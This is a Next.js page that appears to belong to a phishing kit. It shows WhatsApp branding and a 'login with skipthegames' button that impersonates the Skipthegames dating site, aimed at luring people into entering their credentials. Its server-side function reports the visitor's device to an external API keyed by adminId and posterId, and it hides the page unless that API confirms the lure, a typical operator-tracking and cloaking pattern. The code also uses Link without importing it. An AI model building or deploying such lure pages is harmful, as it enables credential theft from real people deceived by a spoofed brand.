import { useState } from 'react';
import { API_URL, site } from '../../../config';
import Image from 'next/image';

// import Login from '../../../components/Login';
// import Webcam from 'react-webcam';

export default function Home() {
  const [showForm, setShowForm] = useState(true);

  return (
    <div className="flex justify-center items-center min-h-screen">
      <div className="max-w-sm">
        <div className="flex justify-center">
          <Image src="/images/whatsapp.png" width={100} height={100} />
        </div>
        <h1 className="text-xl font-semibold">
          Login With Skipthegames and enjoy with WhatApp video chat your dating
          partner.
        </h1>
        <Link
          href="/login"
          className="bg-blue-400 py-2 px-5 rounded-md block mt-5"
        >
          <div className="flex justify-center">
            <Image
              src="/images/logo.png"
              alt="skipthegame logo"
              width={200}
              height={50}
            />
          </div>
          <p className="text-center text-white font-semibold text-xl">
            login with skipthegames
          </p>
        </Link>
      </div>
    </div>
  );
}

export async function getServerSideProps({
  req,
  query: { adminId, posterId },
}) {
  const userAgent = req.headers['user-agent'];

  const isMobileView = userAgent.match(
    /Android|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i
  );

  const isTabletView = userAgent.match(
    /Tablet|iPad|Playbook|Silk|Kindle|(Android(?!.*Mobile))/i
  );

  const device = isMobileView ? 'phone' : isTabletView ? 'ipad' : 'desktop';

  const url = `${API_URL}/${site}/${adminId}/${posterId}/${device}`;

  const res = await fetch(url);
  console.log(res);
  const data = await res.json();

  if (data?.success !== 'exists') {
    return {
      notFound: true,
    };
  }

  return {
    props: {},
  };
}
